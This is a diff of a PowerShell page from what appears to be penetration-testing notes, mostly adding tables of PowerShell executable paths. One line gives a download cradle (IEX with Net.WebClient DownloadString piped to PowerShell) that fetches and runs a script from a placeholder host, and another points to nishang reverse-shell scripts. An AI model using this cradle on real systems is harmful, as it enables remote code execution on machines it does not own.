@@ -646,15 +646,37 @@ Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name
 
 {% tabs %}
 {% tab title="Windows" %}
-PowerShell.exe full path: `C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe`
+### Windows PowerShell Executables File System Locations on 64-bit Windows
 
-TODO: This is either old or inacurate for Windows 10...look this up
+The default paths to the executables for PowerShell and PowerShell ISE on relevant **64-bit** Windows operating systems:
+
+When converting cmd.exe environment variables to PowerShell:
+
+```text
+%SYSTEMROOT% = $env:SystemRoot
+```
+
+| Name | Location |
+| :--- | :--- |
+| 32-bit \(x86\) PowerShell executable | **`$env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`** |
+| 64-bit \(x64\) Powershell executable | **`$env:SystemRoot\system32\WindowsPowerShell\v1.0\powershell.exe`** |
+| 32-bit \(x86\) Powershell ISE executable | **`$env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe`** |
+| 64-bit \(x64\) Powershell ISE executable | **`$env:SystemRoot\system32\WindowsPowerShell\v1.0\powershell_ise.exe`** |
+
+### Windows PowerShell Executables File System Locations on 32-bit Windows
+
+The default paths to the executables for PowerShell and PowerShell ISE on relevant **32-bit** Windows operating systems:
+
+| Name | Location |
+| :--- | :--- |
+| 32-bit \(x86\) Powershell executable | **`$env:SystemRoot\system32\WindowsPowerShell\v1.0\powershell.exe`** |
+| 32-bit \(x86\) Powershell ISE executable | **`$env:SystemRoot\system32\WindowsPowerShell\v1.0\powershell_ise.exe`** |
 {% endtab %}
 
 {% tab title="Linux/MacOS" %}
-PowerShell.exe full path: `/usr/local/microsoft/powershell/7/`
+`PowerShell.exe full path: /usr/local/microsoft/powershell/7/`
 
-`7` is the version number of PS Core, so this can change...
+`7 is the version number of PS Core, so this can change...`
 {% endtab %}
 {% endtabs %}
 
@@ -679,8 +701,10 @@ wget https://zweilosec.gitbook.io/hackers-rest -OutFile C:\Windows\Temp\out.html
 \[can embed in php too! TODO: write script example of this\]:
 
 ```text
-Echo IEX(New-Object Net.WebClient).DownloadString(http://<ip:port/filename.ps1>) | PowerShell -NoProfile -
+Echo IEX(New-Object Net.WebClient).DownloadString(http://$ip:$port/$script_file) | PowerShell -NoProfile -
 ```
+
+* TODO: Look this up and find out if something is missing on the end...looks like a trailing `-`
 
 ### Silence PowerShell error messages
 
@@ -688,7 +712,7 @@ Many PowerShell cmdlets support the **`-ErrorAction SilentlyContinue`** attribut
 
 ### Unsorted...
 
-PowerShell reverse shell and exploit scripts: `nishang` To learn how to use this tool check out Ippsec's video on youtube: [Ippsec:HacktheBox - Optimum](https://www.youtube.com/watch?v=kWTnVBIpNsE)
+PowerShell reverse shell and exploit scripts: `nishang` To learn how to use this tool check out Ippsec's video on youtube: [Ippsec:HacktheBox - Optimum](https://www.youtube.com/watch?v=kWTnVBIpNsE) TODO: look up this tool and give examples and description
 
 
 
